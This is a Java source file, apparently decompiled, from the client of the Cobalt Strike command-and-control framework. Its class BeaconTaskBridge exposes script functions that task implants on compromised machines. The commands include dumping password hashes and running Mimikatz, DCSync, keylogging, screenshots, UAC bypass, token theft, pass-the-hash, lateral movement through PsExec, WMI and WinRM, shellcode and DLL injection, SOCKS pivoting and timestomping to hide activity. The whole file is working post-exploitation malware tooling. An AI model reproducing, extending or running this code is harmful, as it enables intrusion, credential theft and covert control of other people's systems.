package aggressor.bridges;

import aggressor.AggressorClient;
import beacon.Registry;
import beacon.TaskBeacon;
import common.CommonUtils;
import cortana.Cortana;
import sleep.bridges.BridgeUtilities;
import sleep.interfaces.Function;
import sleep.interfaces.Loadable;
import sleep.runtime.Scalar;
import sleep.runtime.ScriptInstance;
import sleep.runtime.SleepUtils;

import java.util.LinkedList;
import java.util.Stack;

public class BeaconTaskBridge implements Function,
        Loadable {
    protected AggressorClient client;

    public BeaconTaskBridge(AggressorClient c) {
        this.client = c;
    }

    @Override
    public void scriptLoaded(ScriptInstance si) {
        LinkedList<String> commands = new LinkedList<>();
        commands.add("&binput");
        commands.add("&berror");
        commands.add("&btask");
        commands.add("&blog");
        commands.add("&blog2");
        commands.add("&bbrowserpivot");
        commands.add("&bbrowserpivot_stop");
        commands.add("&bbypassuac");
        commands.add("&bcancel");
        commands.add("&bcd");
        commands.add("&bcheckin");
        commands.add("&bclear");
        commands.add("&bcovertvpn");
        commands.add("&bcp");
        commands.add("&bdcsync");
        commands.add("&bdesktop");
        commands.add("&bdllinject");
        commands.add("&bdllload");
        commands.add("&bdllspawn");
        commands.add("&bdownload");
        commands.add("&bdrives");
        commands.add("&belevate");
        commands.add("&bexecute");
        commands.add("&bexecute_assembly");
        commands.add("&bexit");
        commands.add("&bgetprivs");
        commands.add("&bgetsystem");
        commands.add("&bgetuid");
        commands.add("&bhashdump");
        commands.add("&binject");
        commands.add("&bjobkill");
        commands.add("&bjobs");
        commands.add("&bkerberos_ccache_use");
        commands.add("&bkerberos_ticket_purge");
        commands.add("&bkerberos_ticket_use");
        commands.add("&bkeylogger");
        commands.add("&bkill");
        commands.add("&blink");
        commands.add("&bloginuser");
        commands.add("&blogonpasswords");
        commands.add("&bmkdir");
        commands.add("&bmimikatz");
        commands.add("&bmode");
        commands.add("&bmv");
        commands.add("&bnetview");
        commands.add("&bnet");
        commands.add("&bnote");
        commands.add("&bpassthehash");
        commands.add("&bpause");
        commands.add("&bportscan");
        commands.add("&bpowerpick");
        commands.add("&bpowershell");
        commands.add("&bpowershell_import");
        commands.add("&bppid");
        commands.add("&bpsexec");
        commands.add("&bpsexec_command");
        commands.add("&bpsexec_psh");
        commands.add("&bpsinject");
        commands.add("&bpwd");
        commands.add("&breg_query");
        commands.add("&breg_queryv");
        commands.add("&brev2self");
        commands.add("&brportfwd");
        commands.add("&brportfwd_stop");
        commands.add("&brm");
        commands.add("&brunas");
        commands.add("&brunasadmin");
        commands.add("&brunu");
        commands.add("&bsetenv");
        commands.add("&bscreenshot");
        commands.add("&bshell");
        commands.add("&bshinject");
        commands.add("&bshspawn");
        commands.add("&bsleep");
        commands.add("&bsocks");
        commands.add("&bsocks_stop");
        commands.add("&bspawn");
        commands.add("&bspawnas");
        commands.add("&bspawnto");
        commands.add("&bspawnu");
        commands.add("&bssh");
        commands.add("&bssh_key");
        commands.add("&bstage");
        commands.add("&bsteal_token");
        commands.add("&bsudo");
        commands.add("&btimestomp");
        commands.add("&bunlink");
        commands.add("&bupload");
        commands.add("&bupload_raw");
        commands.add("&bwdigest");
        commands.add("&bwinrm");
        commands.add("&bwmi");
        for (String command : commands) {
            Cortana.put(si, command, this);
            Cortana.put(si, command + "!", this);
        }
    }

    @Override
    public void scriptUnloaded(ScriptInstance si) {
    }

    public static String[] bids(Stack args) {
        return BeaconBridge.bids(args);
    }

    /*
     * Enabled force condition propagation
     * Lifted jumps to return sites
     */
    @Override
    public Scalar evaluate(String name, ScriptInstance script, Stack args) {
        String[] bids = BeaconTaskBridge.bids(args);
        TaskBeacon tasker = new TaskBeacon(this.client, bids);
        if (name.endsWith("!")) {
            name = CommonUtils.stripRight(name, "!");
            tasker.silent();
        }
        switch (name) {
            case "&bbrowserpivot": {
                int pid = BridgeUtilities.getInt(args, 0);
                String arch = BridgeUtilities.getString(args, "x86");
                tasker.BrowserPivot(pid, arch);
                break;
            }
            case "&bbrowserpivot_stop":
                tasker.BrowserPivotStop();
                break;
            case "&bbypassuac": {
                String listener = BridgeUtilities.getString(args, "");
                tasker.BypassUAC(listener);
                break;
            }
            case "&bcancel": {
                String file = BridgeUtilities.getString(args, "");
                tasker.Cancel(file);
                break;
            }
            case "&bclear":
                tasker.Clear();
                break;
            case "&bcd": {
                String folder = BridgeUtilities.getString(args, "");
                tasker.Cd(folder);
                break;
            }
            case "&bcheckin":
                tasker.Checkin();
                break;
            case "&bcovertvpn":
                String intf = BridgeUtilities.getString(args, "");
                String targetip = BridgeUtilities.getString(args, "");
                if (args.isEmpty()) {
                    for (String bid : bids) {
                        tasker.CovertVPN(bid, intf, targetip, null);
                    }
                    break;
                } else {
                    String hwaddr = BridgeUtilities.getString(args, "");
                    for (String bid : bids) {
                        tasker.CovertVPN(bid, intf, targetip, hwaddr);
                    }
                }
                break;
            case "&bcp": {
                String src = BridgeUtilities.getString(args, "");
                String dst = BridgeUtilities.getString(args, "");
                tasker.Copy(src, dst);
                break;
            }
            case "&bdcsync": {
                String fqdn = BridgeUtilities.getString(args, "");
                String user = BridgeUtilities.getString(args, "");
                tasker.DcSync(fqdn, user);
                break;
            }
            case "&bdesktop":
                tasker.Desktop(true);
                break;
            case "&bdllinject": {
                int pid = BridgeUtilities.getInt(args, 0);
                String file = BridgeUtilities.getString(args, "");
                tasker.DllInject(pid, file);
                break;
            }
            case "&bdllload": {
                int pid = BridgeUtilities.getInt(args, 0);
                String file = BridgeUtilities.getString(args, "");
                tasker.DllLoad(pid, file);
                break;
            }
            case "&bdllspawn": {
                String file = BridgeUtilities.getString(args, "");
                String arg = BridgeUtilities.getString(args, null);
                String desc = BridgeUtilities.getString(args, null);
                int waittime = BridgeUtilities.getInt(args, 0);
                tasker.DllSpawn(file, arg, desc, waittime);
                break;
            }
            case "&bdownload": {
                String file = BridgeUtilities.getString(args, "");
                tasker.Download(file);
                break;
            }
            case "&bdrives":
                tasker.Drives();
                break;
            case "&belevate": {
                String ename = BridgeUtilities.getString(args, "");
                String listener = BridgeUtilities.getString(args, "");
                tasker.Elevate(ename, listener);
                break;
            }
            case "&berror": {
                String text = BridgeUtilities.getString(args, "");
                tasker.error(text);
                break;
            }
            case "&bexecute": {
                String file = BridgeUtilities.getString(args, "");
                tasker.Execute(file);
                break;
            }
            case "&bexecute_assembly": {
                String path = BridgeUtilities.getString(args, "");
                String aargs = BridgeUtilities.getString(args, "");
                tasker.ExecuteAssembly(path, aargs);
                break;
            }
            case "&bexit":
                tasker.Die();
                break;
            case "&bgetuid":
                tasker.GetUID();
                break;
            case "&bhashdump":
                tasker.Hashdump();
                break;
            case "&binject": {
                int pid = BridgeUtilities.getInt(args, 0);
                String listener = BridgeUtilities.getString(args, "");
                String arch = BridgeUtilities.getString(args, "x86");
                tasker.Inject(pid, listener, arch);
                break;
            }
            case "&binput": {
                String value = BridgeUtilities.getString(args, "");
                tasker.input(value);
                break;
            }
            case "&bgetprivs": {
                if (args.isEmpty()) {
                    tasker.GetPrivs();
                    break;
                } else {
                    String privs = BridgeUtilities.getString(args, "");
                    tasker.GetPrivs(privs);
                }
                break;
            }
            case "&bgetsystem": {
                tasker.GetSystem();
                break;
            }
            case "&bjobkill": {
                int jid = BridgeUtilities.getInt(args, 0);
                tasker.JobKill(jid);
                break;
            }
            case "&bjobs": {
                tasker.Jobs();
                break;
            }
            case "&bkerberos_ticket_purge": {
                tasker.KerberosTicketPurge();
                break;
            }
            case "&bkerberos_ticket_use": {
                String arg = BridgeUtilities.getString(args, "");
                tasker.KerberosTicketUse(arg);
                break;
            }
            case "&bkerberos_ccache_use": {
                String arg = BridgeUtilities.getString(args, "");
                tasker.KerberosCCacheUse(arg);
                break;
            }
            case "&bkeylogger": {
                if (args.isEmpty()) {
                    tasker.KeyLogger();
                    break;
                } else {
                    int pid = BridgeUtilities.getInt(args, 0);
                    String arch = BridgeUtilities.getString(args, "x86");
                    tasker.KeyLogger(pid, arch);
                }
                break;
            }
            case "&bkill": {
                int pid = BridgeUtilities.getInt(args, 0);
                tasker.Kill(pid);
                break;
            }
            case "&blink": {
                String arg = BridgeUtilities.getString(args, "");
                tasker.Link(arg);
                break;
            }
            case "&blog": {
                String text = BridgeUtilities.getString(args, "");
                tasker.log(text);
                break;
            }
            case "&blog2": {
                String text = BridgeUtilities.getString(args, "");
                tasker.log2(text);
                break;
            }
            case "&bloginuser": {
                String domain = BridgeUtilities.getString(args, "");
                String user = BridgeUtilities.getString(args, "");
                String pass = BridgeUtilities.getString(args, "");
                tasker.LoginUser(domain, user, pass);
                break;
            }
            case "&blogonpasswords": {
                tasker.LogonPasswords();
                break;
            }
            case "&bmimikatz": {
                String command = BridgeUtilities.getString(args, "");
                tasker.Mimikatz(command);
                break;
            }
            case "&bmkdir": {
                String folder = BridgeUtilities.getString(args, "");
                tasker.MkDir(folder);
                break;
            }
            case "&bmode": {
                String arg = BridgeUtilities.getString(args, "");
                switch (arg) {
                    case "dns":
                        tasker.ModeDNS();
                        break;
                    case "dns6":
                        tasker.ModeDNS6();
                        break;
                    case "dns-txt":
                        tasker.ModeDNS_TXT();
                        break;
                    case "http":
                        tasker.ModeHTTP();
                        break;
                    default:
                        if (!"smb".equals(arg)) throw new RuntimeException("Invalid mode: '" + arg + "'");
                        tasker.ModeSMB();
                        break;
                }
                break;
            }
            case "&bmv": {
                String src = BridgeUtilities.getString(args, "");
                String dst = BridgeUtilities.getString(args, "");
                tasker.Move(src, dst);
                break;
            }
            case "&bnet": {
                String verb = BridgeUtilities.getString(args, "");
                String target = BridgeUtilities.getString(args, null);
                String param = BridgeUtilities.getString(args, null);
                tasker.NetView(verb, target, param);
                break;
            }
            case "&bnetview": {
                if (!args.isEmpty()) {
                    String domain = BridgeUtilities.getString(args, "");
                    tasker.NetView("view", domain, null);
                    break;
                } else {
                    tasker.NetView("view", null, null);
                }
                break;
            }
            case "&bnote": {
                String arg = BridgeUtilities.getString(args, "");
                tasker.Note(arg);
                break;
            }
            case "&bpassthehash": {
                String domain = BridgeUtilities.getString(args, "");
                String user = BridgeUtilities.getString(args, "");
                String pass = BridgeUtilities.getString(args, "");
                tasker.PassTheHash(domain, user, pass);
                break;
            }
            case "&bpause": {
                int time = BridgeUtilities.getInt(args, 0);
                tasker.Pause(time);
                break;
            }
            case "&bportscan": {
                String targets = BridgeUtilities.getString(args, "");
                String ports = BridgeUtilities.getString(args, "1-1024");
                String discovery = BridgeUtilities.getString(args, "arp");
                int maxsockets = BridgeUtilities.getInt(args, 1024);
                tasker.PortScan(targets, ports, discovery, maxsockets);
                break;
            }
            case "&bpowerpick": {
                String arg = BridgeUtilities.getString(args, "");
                tasker.PowerShellUnmanaged(arg);
                break;
            }
            case "&bpowershell": {
                String arg = BridgeUtilities.getString(args, "");
                tasker.PowerShell(arg);
                break;
            }
            case "&bpowershell_import": {
                String arg = BridgeUtilities.getString(args, "");
                tasker.PowerShellImport(arg);
                break;
            }
            case "&bppid": {
                int ppid = BridgeUtilities.getInt(args, 0);
                tasker.PPID(ppid);
                break;
            }
            case "&bpsexec": {
                String target = BridgeUtilities.getString(args, "");
                String listener = BridgeUtilities.getString(args, "");
                String share = BridgeUtilities.getString(args, "ADMIN$");
                tasker.PsExec(target, listener, share);
                break;
            }
            case "&bpsexec_command": {
                String target = BridgeUtilities.getString(args, "");
                String sname = BridgeUtilities.getString(args, "");
                String command = BridgeUtilities.getString(args, "");
                tasker.PsExecCommand(target, sname, command);
                break;
            }
            case "&bpsexec_psh": {
                String target = BridgeUtilities.getString(args, "");
                String listener = BridgeUtilities.getString(args, "");
                tasker.PsExecPSH(target, listener);
                break;
            }
            case "&bpsinject": {
                int pid = BridgeUtilities.getInt(args, 0);
                String arch = BridgeUtilities.getString(args, "x86");
                String commands = BridgeUtilities.getString(args, "");
                tasker.PsInject(pid, arch, commands);
                break;
            }
            case "&bpwd": {
                tasker.Pwd();
                break;
            }
            case "&breg_query": {
                String path = BridgeUtilities.getString(args, "");
                String arch = BridgeUtilities.getString(args, "x86");
                tasker.RegQuery(new Registry(arch, path, false));
                break;
            }
            case "&breg_queryv": {
                String path = BridgeUtilities.getString(args, "");
                String subkey = BridgeUtilities.getString(args, "");
                String arch = BridgeUtilities.getString(args, "x86");
                tasker.RegQueryValue(new Registry(arch, path + " " + subkey, true));
                break;
            }
            case "&brev2self": {
                tasker.Rev2Self();
                break;
            }
            case "&brm": {
                String folder = BridgeUtilities.getString(args, "");
                if ("".equals(folder)) {
                    throw new IllegalArgumentException("argument is empty (you don't want this)");
                }
                tasker.Rm(folder);
                break;
            }
            case "&brportfwd": {
                int bport = BridgeUtilities.getInt(args, 0);
                String fhost = BridgeUtilities.getString(args, "");
                int fport = BridgeUtilities.getInt(args, 0);
                tasker.PortForward(bport, fhost, fport);
            }
            break;
            case "&brportfwd_stop": {
                int port = BridgeUtilities.getInt(args, 0);
                tasker.PortForwardStop(port);
                break;
            }
            case "&brunas": {
                String domain = BridgeUtilities.getString(args, "");
                String user = BridgeUtilities.getString(args, "");
                String pass = BridgeUtilities.getString(args, "");
                String command = BridgeUtilities.getString(args, "");
                tasker.RunAs(domain, user, pass, command);
                break;
            }
            case "&brunasadmin": {
                String command = BridgeUtilities.getString(args, "");
                tasker.ExecuteHighIntegrity(command, "Tasked Beacon to execute: " + command + " in a high integrity context");
                break;
            }
            case "&brunu": {
                int ppid = BridgeUtilities.getInt(args, 0);
                String command = BridgeUtilities.getString(args, "");
                tasker.RunUnder(ppid, command);
                break;
            }
            case "&bscreenshot": {
                int time = BridgeUtilities.getInt(args, 0);
                tasker.Screenshot(time);
                break;
            }
            case "&bsetenv": {
                String key = BridgeUtilities.getString(args, "");
                if (!args.isEmpty()) {
                    String value = BridgeUtilities.getString(args, "");
                    tasker.SetEnv(key, value);
                    break;
                } else {
                    tasker.SetEnv(key, null);
                }
                break;
            }
            case "&bshell": {
                String arg = BridgeUtilities.getString(args, "");
                tasker.Shell(arg);
                break;
            }
            case "&bshinject": {
                int pid = BridgeUtilities.getInt(args, 0);
                String arch = BridgeUtilities.getString(args, "x86");
                String file = BridgeUtilities.getString(args, "");
                tasker.ShellcodeInject(pid, arch, file);
                break;
            }
            case "&bshspawn": {
                String arch = BridgeUtilities.getString(args, "x86");
                String file = BridgeUtilities.getString(args, "");
                tasker.ShellcodeSpawn(arch, file);
                break;
            }
            case "&bsleep": {
                int time = BridgeUtilities.getInt(args, 0);
                int jitter = BridgeUtilities.getInt(args, 0);
                tasker.Sleep(time, jitter);
                break;
            }
            case "&bsocks": {
                int port = BridgeUtilities.getInt(args, 0);
                tasker.SocksStart(port);
                break;
            }
            case "&bsocks_stop": {
                tasker.SocksStop();
                break;
            }
            case "&bspawn": {
                String listener = BridgeUtilities.getString(args, "");
                String arch = BridgeUtilities.getString(args, "x86");
                tasker.Spawn(listener, arch);
                break;
            }
            case "&bspawnas": {
                String domain = BridgeUtilities.getString(args, "");
                String user = BridgeUtilities.getString(args, "");
                String pass = BridgeUtilities.getString(args, "");
                String listener = BridgeUtilities.getString(args, "");
                tasker.SpawnAs(domain, user, pass, listener);
                break;
            }
            case "&bspawnto":
                if (args.isEmpty()) {
                    tasker.SpawnTo();
                    break;
                } else {
                    String arch = BridgeUtilities.getString(args, "x86");
                    String path = BridgeUtilities.getString(args, "");
                    tasker.SpawnTo(arch, path);
                }
                break;
            case "&bspawnu": {
                int ppid = BridgeUtilities.getInt(args, 0);
                String listener = BridgeUtilities.getString(args, "");
                tasker.SpawnUnder(ppid, listener);
                break;
            }
            case "&bssh": {
                String target = BridgeUtilities.getString(args, "");
                int port = BridgeUtilities.getInt(args, 22);
                String user = BridgeUtilities.getString(args, "");
                String pass = BridgeUtilities.getString(args, "");
                tasker.SecureShell(user, pass, target, port);
                break;
            }
            case "&bssh_key": {
                String target = BridgeUtilities.getString(args, "");
                int port = BridgeUtilities.getInt(args, 22);
                String user = BridgeUtilities.getString(args, "");
                String key = BridgeUtilities.getString(args, "");
                tasker.SecureShellPubKey(user, CommonUtils.toBytes(key), target, port);
                break;
            }
            case "&bstage": {
                String target = BridgeUtilities.getString(args, "");
                String listener = BridgeUtilities.getString(args, "");
                String arch = BridgeUtilities.getString(args, "x86");
                if ("".equals(target)) {
                    tasker.handleBindStager(listener, arch);
                    break;
                } else {
                    tasker.handlePipeStager(target, listener);
                }
                break;
            }
            case "&bsteal_token": {
                int pid = BridgeUtilities.getInt(args, 0);
                tasker.StealToken(pid);
                break;
            }
            case "&bsudo": {
                String pass = BridgeUtilities.getString(args, "");
                String command = BridgeUtilities.getString(args, "");
                tasker.ShellSudo(pass, command);
                break;
            }
            case "&btask": {
                String text = BridgeUtilities.getString(args, "");
                String tactic = BridgeUtilities.getString(args, "");
                tasker.task(text, tactic);
                break;
            }
            case "&btimestomp": {
                String arg1 = BridgeUtilities.getString(args, "");
                String arg2 = BridgeUtilities.getString(args, "");
                tasker.TimeStomp(arg1, arg2);
                break;
            }
            case "&bunlink": {
                String arg = BridgeUtilities.getString(args, "");
                tasker.Unlink(arg);
                break;
            }
            case "&bupload": {
                String arg1 = BridgeUtilities.getString(args, "");
                tasker.Upload(arg1);
                break;
            }
            case "&bupload_raw": {
                String arg1 = BridgeUtilities.getString(args, "");
                String arg2 = BridgeUtilities.getString(args, "");
                String arg3 = BridgeUtilities.getString(args, arg1);
                tasker.UploadRaw(arg3, arg1, CommonUtils.toBytes(arg2));
                break;
            }
            case "&bwdigest":
                tasker.WDigest();
                break;
            case "&bwinrm": {
                String target = BridgeUtilities.getString(args, "");
                String listener = BridgeUtilities.getString(args, "");
                tasker.WinRM(target, listener);
                break;
            }
            case "&bwmi": {
                String target = BridgeUtilities.getString(args, "");
                String listener = BridgeUtilities.getString(args, "");
                tasker.WMI(target, listener);
                break;
            }
            default:
                break;
        }
        return SleepUtils.getEmptyScalar();
    }
}

